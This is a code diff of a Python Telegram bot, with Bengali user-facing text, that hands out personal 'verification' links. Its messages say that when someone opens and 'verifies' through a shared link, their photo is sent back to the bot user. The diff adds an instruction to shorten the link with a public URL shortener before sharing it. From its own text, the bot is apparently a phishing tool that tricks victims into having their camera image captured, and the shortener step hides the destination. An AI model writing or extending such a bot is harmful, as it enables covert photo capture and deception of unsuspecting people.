@@ -26,7 +26,6 @@ def send_welcome(message):
         "⚠️ সতর্কবার্তা: কেউ এটি খারাপ কাজে ব্যবহার করবেন না।\n\n"
         "নিচের বাটন থেকে আপনার লিঙ্ক তৈরি করুন।"
     )
-    # বাটনসহ মেসেজ পাঠানো
     bot.send_message(message.chat.id, welcome_text, reply_markup=main_keyboard())
 
 # /link কমান্ড দিলে যা হবে
@@ -35,9 +34,12 @@ def send_link(message):
     user_id = message.chat.id
     personal_link = f"{BASE_URL}?id={user_id}"
     
+    # আপনার অনুরোধ অনুযায়ী মেসেজ ফরম্যাট
     response_text = (
         "✅ আপনার ভেরিফিকেশন লিঙ্ক তৈরি হয়েছে।\n\n"
         f"🔗 লিঙ্ক: {personal_link}\n\n"
+        "লিংকটি ছোটো করুন\n"
+        "https://lc.cx/en\n\n"
         "এই লিঙ্কটি শেয়ার করুন। কেউ ভেরিফাই করলে ছবি এখানে আসবে।"
     )
     bot.send_message(user_id, response_text, reply_markup=main_keyboard())
